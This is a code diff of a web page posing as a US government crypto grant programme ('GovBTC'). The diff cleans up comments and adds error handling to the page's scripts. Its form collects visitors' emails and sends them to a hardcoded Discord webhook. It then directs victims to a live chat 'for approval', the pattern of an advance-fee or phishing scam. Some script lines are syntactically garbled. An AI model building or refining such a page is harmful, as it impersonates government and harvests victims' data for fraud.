@@ -8,7 +8,7 @@
     <script type="text/javascript">
         var _smartsupp = _smartsupp || {};
         _smartsupp.key = 'e99fb2b135abd996810c4549a9bd0573ddb32b57'; // Replace with your actual key
-        _smartsupp.customColor = '#003087'; // Matches navy blue theme
+        _smartsupp.customColor = '#003087';
         _smartsupp.position = 'bottom-right';
         window.smartsupp || (function(d) {
             var s, c, o = smartsupp = function() { o..push(arguments); }; o. = [];
@@ -23,7 +23,7 @@
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background: linear-gradient(135deg, #003087 0%, #4a90e2 100%); /* Professional gradient, no arrows */
+            background: linear-gradient(135deg, #003087 0%, #4a90e2 100%);
             color: #333;
             min-height: 100vh;
         }
@@ -59,7 +59,7 @@
         }
         .sidebar {
             float: left;
-            width: 35%; /* Widened for professional look */
+            width: 35%;
             background-color: rgba(255, 255, 255, 0.95);
             padding: 20px;
             box-shadow: 2px 0 5px rgba(0,0,0,0.1);
@@ -215,9 +215,9 @@
             box-shadow: 0 0 5px rgba(0,0,0,0.1);
         }
         .partner-logos img {
-            width: 120px; /* Increased size for visibility */
+            width: 120px;
             margin: 10px;
-            opacity: 1; /* Full visibility */
+            opacity: 1;
         }
         footer {
             clear: both;
@@ -245,7 +245,7 @@
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 150 50">
             <rect width="150" height="50" fill="#003087"/>
             <text x="10" y="35" font-family="Arial, sans-serif" font-size="20" fill="white">GovBTC</text>
-            <path d="M30 10 L40 10 L35 20 Z" fill="#ffd700"/> <!-- Small gold triangle for logo -->
+            <path d="M30 10 L40 10 L35 20 Z" fill="#ffd700"/>
         </svg>
         <h1>Government Crypto Grant and Reserve</h1>
         <p>Empowering American Innovation Through Secure Crypto Funding – Established 2025</p>
@@ -263,7 +263,7 @@
         </div>
         <div class="main-content">
             <h2>Applicant Registration</h2>
-            <form id="applicantForm" onsubmit="generateReferenceCode(event)">
+            <form id="applicantForm">
                 <div class="form-group">
                     <label for="email">Email:</label>
                     <input type="email" id="email" name="email" required>
@@ -272,7 +272,7 @@
                     <label for="referenceId">Reference ID:</label>
                     <input type="text" id="referenceId" name="referenceId" readonly>
                 </div>
-                <button type="submit">Generate Reference Code</button>
+                <button type="submit" onclick="generateReferenceCode()">Generate Reference Code</button>
             </form>
             <div id="statusMessage"></div>
             <div class="reference-codes">
@@ -370,48 +370,87 @@
         let currentCodeIndex = 0;
 
         function updateReferenceCode() {
-            const displayRefCode = document.getElementById('displayRefCode');
-            displayRefCode.textContent = Current Reference Code: ${referenceCodes[currentCodeIndex]};
-            currentCodeIndex = (currentCodeIndex + 1) % referenceCodes.length;
+            try {
+                const displayRefCode = document.getElementById('displayRefCode');
+                if (displayRefCode) {
+                    displayRefCode.textContent = Current Reference Code: ${referenceCodes[currentCodeIndex]};
+                    currentCodeIndex = (currentCodeIndex + 1) % referenceCodes.length;
+                    console.log('Updated reference code:', referenceCodes[currentCodeIndex]);
+                } else {
+                    console.error('Element #displayRefCode not found');
+                }
+            } catch (error) {
+                console.error('Error in updateReferenceCode:', error);
+            }
         }
 
         // Start cycling reference codes
         updateReferenceCode();
-        setInterval(updateReferenceCode, 5000); // Change every 5 seconds
+        setInterval(updateReferenceCode, 5000);
 
-        function generateReferenceCode(event) {
-            event.preventDefault();
-            const email = document.getElementById('email').value;
-            const referenceId = referenceCodes[Math.floor(Math.random() * referenceCodes.length)];
-            const statusMessage = document.getElementById('statusMessage');
-            document.getElementById('referenceId').value = referenceId;
-            statusMessage.style.display = 'block';
-            statusMessage.textContent = Reference code generated: ${referenceId}. Contact live chat for approval.;
+        function generateReferenceCode() {
+            try {
+                const email = document.getElementById('email').value;
+                const referenceIdInput = document.getElementById('referenceId');
+                const statusMessage = document.getElementById('statusMessage');
 
-            const data = {
-                content: 🔥 New Registration - Government Crypto Grant:\nEmail: *${email}*\nReference ID: *${referenceId}*
-            };
+                if (!email) {
+                    statusMessage.style.display = 'block';
+                    statusMessage.style.color = 'red';
+                    statusMessage.textContent = 'Please enter a valid email.';
+                    console.error('No email provided');
+                    return;
+                }
 
-            fetch('https://discord.com/api/webhooks/1392560855530602496/WLDqr-oxayIjorh97lgir03TQj4rcVYqnKDEMCoJ_jC_xix590twBocxE4eMY85ViMzG', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(err => console.error(err));
+                const referenceId = referenceCodes[Math.floor(Math.random() * referenceCodes.length)];
+                referenceIdInput.value = referenceId;
+                statusMessage.style.display = 'block';
+                statusMessage.style.color = 'green';
+                statusMessage.textContent = Reference code generated: ${referenceId}. Contact live chat for approval.;
+                console.log('Generated reference code:', referenceId);
+
+                const data = {
+                    content: 🔥 New Registration - Government Crypto Grant:\nEmail: *${email}*\nReference ID: *${referenceId}*
+                };
+
+                fetch('https://discord.com/api/webhooks/1392560855530602496/WLDqr-oxayIjorh97lgir03TQj4rcVYqnKDEMCoJ_jC_xix590twBocxE4eMY85ViMzG', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Webhook failed:', response.status);
+                    } else {
+                        console.log('Webhook sent successfully');
+                    }
+                })
+                .catch(err => console.error('Webhook error:', err));
+            } catch (error) {
+                console.error('Error in generateReferenceCode:', error);
+                document.getElementById('statusMessage').style.display = 'block';
+                document.getElementById('statusMessage').style.color = 'red';
+                document.getElementById('statusMessage').textContent = 'Error generating code. Please try again.';
+            }
         }
 
         function checkEligibility(event) {
             event.preventDefault();
-            const citizen = document.querySelector('select[name="citizen"]').value;
-            const age = document.querySelector('select[name="age"]').value;
-            const quizResult = document.getElementById('quizResult');
-            if (citizen === 'yes' && age === 'yes') {
-                quizResult.style.display = 'block';
-                quizResult.style.color = 'green';
-                quizResult.textContent = 'Congratulations! You are pre-qualified. Proceed to generate your reference code.';
-            } else {
-                quizResult.style.display = 'block';
-                quizResult.style.color = 'red';
-                quizResult.textContent = 'Sorry, you do not meet the eligibility criteria at this time.';
+            try {
+                const citizen = document.querySelector('select[name="citizen"]').value;
+                const age = document.querySelector('select[name="age"]').value;
+                const quizResult = document.getElementById('quizResult');
+                if (citizen === 'yes' && age === 'yes') {
+                    quizResult.style.display = 'block';
+                    quizResult.style.color = 'green';
+                    quizResult.textContent = 'Congratulations! You are pre-qualified. Proceed to generate your reference code.';
+                } else {
+                    quizResult.style.display = 'block';
+                    quizResult.style.color = 'red';
+                    quizResult.textContent = 'Sorry, you do not meet the eligibility criteria at this time.';
+                }
+            } catch (error) {
+                console.error('Error in checkEligibility:', error);
             }
         }
 
